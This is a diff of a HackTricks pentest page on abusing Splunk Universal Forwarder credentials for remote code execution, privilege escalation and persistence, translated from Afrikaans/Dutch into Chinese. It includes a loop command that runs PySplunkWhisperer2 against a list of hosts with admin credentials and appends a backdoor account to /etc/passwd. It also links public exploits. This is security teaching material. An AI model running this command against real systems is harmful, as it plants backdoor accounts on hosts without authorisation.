@@ -1,75 +1,75 @@
-# Splunk LPE en Volharding
+# Splunk LPE 和持久性
 
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>支持 HackTricks</summary>
 
-* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 分享黑客技巧。
 
 </details>
 {% endhint %}
 
-As jy **'n masjien intern of ekstern opneem** en jy vind **Splunk wat loop** (poort 8090), as jy gelukkig enige **geldige akrediteer** ken, kan jy die **Splunk diens misbruik** om **'n shell** as die gebruiker wat Splunk loop, uit te voer. As root dit loop, kan jy voorregte na root opgradeer.
+如果在**内部**或**外部**枚举一台机器时发现**Splunk 正在运行**（端口 8090），如果你幸运地知道任何**有效凭据**，你可以**利用 Splunk 服务**以运行 Splunk 的用户身份**执行 shell**。如果是 root 用户在运行，你可以提升权限到 root。
 
-Ook, as jy **alreeds root is en die Splunk diens nie net op localhost luister nie**, kan jy die **wagwoord** lêer **van** die Splunk diens **steel** en die wagwoorde **kraak**, of **nuwe** akrediteer aan dit **toevoeg**. En volharding op die gasheer handhaaf.
+此外，如果你已经是 root 并且 Splunk 服务不仅在 localhost 上监听，你可以**窃取** Splunk 服务的**密码**文件并**破解**密码，或者**添加新的**凭据。并在主机上保持持久性。
 
-In die eerste beeld hieronder kan jy sien hoe 'n Splunkd webblad lyk.
+在下面的第一张图片中，你可以看到 Splunkd 网页的样子。
 
 
 
-## Splunk Universele Voorouer Agent Exploit Samevatting
+## Splunk Universal Forwarder Agent 漏洞总结
 
-Vir verdere besonderhede, kyk die pos [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Dit is net 'n samevatting:
+有关更多详细信息，请查看帖子 [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)。这只是一个总结：
 
-**Exploit Oorsig:**
-'n Exploit wat die Splunk Universele Voorouer Agent (UF) teiken, laat aanvallers met die agent wagwoord toe om arbitrêre kode op stelsels wat die agent loop, uit te voer, wat moontlik 'n hele netwerk in gevaar stel.
+**漏洞概述：**
+针对 Splunk Universal Forwarder Agent (UF) 的漏洞允许拥有代理密码的攻击者在运行该代理的系统上执行任意代码，可能会危及整个网络。
 
-**Belangrike Punten:**
-- Die UF agent valideer nie inkomende verbindings of die egtheid van kode nie, wat dit kwesbaar maak vir ongeoorloofde kode-uitvoering.
-- Algemene wagwoord verkrygingsmetodes sluit in om dit in netwerk gidse, lêer deel, of interne dokumentasie te vind.
-- Suksevolle uitbuiting kan lei tot SYSTEM of root vlak toegang op gecompromitteerde gashere, data uitvloeiing, en verdere netwerk infiltrasie.
+**关键点：**
+- UF 代理不验证传入连接或代码的真实性，使其容易受到未经授权的代码执行攻击。
+- 常见的密码获取方法包括在网络目录、文件共享或内部文档中查找。
+- 成功利用可能导致在受损主机上获得 SYSTEM 或 root 级别的访问权限、数据外泄和进一步的网络渗透。
 
-**Exploit Uitvoering:**
-1. Aanvaller verkry die UF agent wagwoord.
-2. Gebruik die Splunk API om opdragte of skripte na die agente te stuur.
-3. Moglike aksies sluit lêer ekstraksie, gebruiker rekening manipulasie, en stelsel kompromie in.
+**漏洞执行：**
+1. 攻击者获取 UF 代理密码。
+2. 利用 Splunk API 向代理发送命令或脚本。
+3. 可能的操作包括文件提取、用户账户操作和系统妥协。
 
-**Impak:**
-- Volledige netwerk kompromie met SYSTEM/root vlak toestemmings op elke gasheer.
-- Potensiaal om logging te deaktiveer om opsporing te ontduik.
-- Installering van agterdeure of ransomware.
+**影响：**
+- 在每个主机上完全控制网络，拥有 SYSTEM/root 级别的权限。
+- 可能禁用日志记录以逃避检测。
+- 安装后门或勒索软件。
 
-**Voorbeeld Opdrag vir Uitbuiting:**
+**利用示例命令：**
 ```bash
 for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
 ```
-**Gebruikbare openbare exploits:**
+**可用的公共漏洞：**
 * https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
 * https://www.exploit-db.com/exploits/46238
 * https://www.exploit-db.com/exploits/46487
 
 
-## Misbruik van Splunk-vrae
+## 滥用 Splunk 查询
 
-**Vir verdere besonderhede, kyk na die pos [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)**
+**有关更多详细信息，请查看帖子 [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)**
 
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>支持 HackTricks</summary>
 
-* Kyk na die [**subskripsieplanne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **在** **Twitter** 🐦 **上关注我们** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享黑客技巧。
 
 </details>
 {% endhint %}
